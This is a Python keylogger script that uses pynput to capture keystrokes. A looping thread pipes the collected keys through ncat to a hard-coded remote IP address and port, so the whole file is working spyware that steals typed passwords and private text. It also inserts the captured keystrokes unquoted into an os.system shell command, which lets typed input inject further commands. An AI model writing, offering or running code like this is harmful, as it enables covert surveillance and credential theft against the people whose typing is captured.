from pynput.keyboard import Key, Listener
import os, time
from concurrent.futures import ThreadPoolExecutor   

liskey = []
al = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+{}|:<>?")

def keyfunc():
    def on_press(key):
        if str(key)[1:-1] in al:
            liskey.append(str(key)[1:-1])
        print(f'{str(key)} pressed')


    def on_release(key):
        if key == Key.esc:
            # Stop listener
            exit
            return False


    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
       

def server():
    while True:
        k = str(''.join(liskey))
        print(k)
        com = f'echo {k} | ncat 42.105.142.93a 8000 -w 1'
        os.system(com)
       

def main():
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Submit tasks to the executor
        futures = [executor.submit(server), executor.submit(keyfunc)]

main()
        
